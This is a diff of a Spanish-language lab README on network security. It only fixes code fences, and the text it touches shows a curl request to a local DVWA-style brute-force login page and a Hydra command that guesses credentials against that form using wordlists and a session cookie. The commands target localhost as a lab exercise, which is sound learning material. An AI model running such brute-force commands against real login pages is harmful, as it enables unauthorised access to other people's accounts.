@@ -1,7 +1,8 @@
 # Laboratorio-2-Criptograf-a-y-Seguridad-en-redes
 ## CURL
 El comando para generar la consulta es el siguieten:
-¨¨¨
+
+```
 curl 'http://localhost/vulnerabilities/brute/?username=admin&password=password&Login=Login' \
   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
   -H 'Accept-Language: es-419,es;q=0.9' \
@@ -19,10 +20,11 @@ curl 'http://localhost/vulnerabilities/brute/?username=admin&password=password&L
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Linux"' \
   --compressed
-¨¨¨
+```
 
 ## HYDRA
 El comando para ejecutar hydra es el siguiente:
-¨¨¨
+
+```
 hydra -L user.dic -P password.dic "http-get-form://localhost:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=rvepmt4r9nuvbn3vd1rndvu174; security=low;:F=Username and/or password incorrect."
-¨¨¨
+```
